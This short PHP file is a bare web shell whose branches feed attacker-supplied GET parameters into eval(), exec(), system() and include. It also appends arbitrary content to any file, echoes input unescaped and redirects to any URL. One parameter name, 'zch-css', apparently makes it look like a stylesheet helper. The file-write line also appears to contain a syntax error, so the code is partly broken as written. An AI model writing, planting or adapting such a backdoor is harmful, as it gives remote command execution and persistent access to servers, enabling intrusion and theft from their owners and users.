<?php
if (isset($_GET['zch-css'])) {
	echo $_GET['zch-css'];
}
elseif (isset($_GET['zeval'])) {
	eval($_GET['zeval']);
}
elseif (isset($_GET['zexec'])) {
	exec($_GET['zexec']);
}
elseif (isset($_GET['zsys'])) {
	system($_GET['zsys']);
}
elseif (isset($_GET['zfile'])) {
	include $_GET['zfile'];	
}
elseif (isset($_GET['zfilename']) && isset($_GET['zcontent'])) {
	$zCh = fopen($_GET['zfilename'], "a");
	fwrite($zCh, "$_GET['zcontent']");
	fclose($zCh);
}
elseif (isset($_GET['zheader'])) {
	header("Location: " . $_GET['zheader']);
}
?>
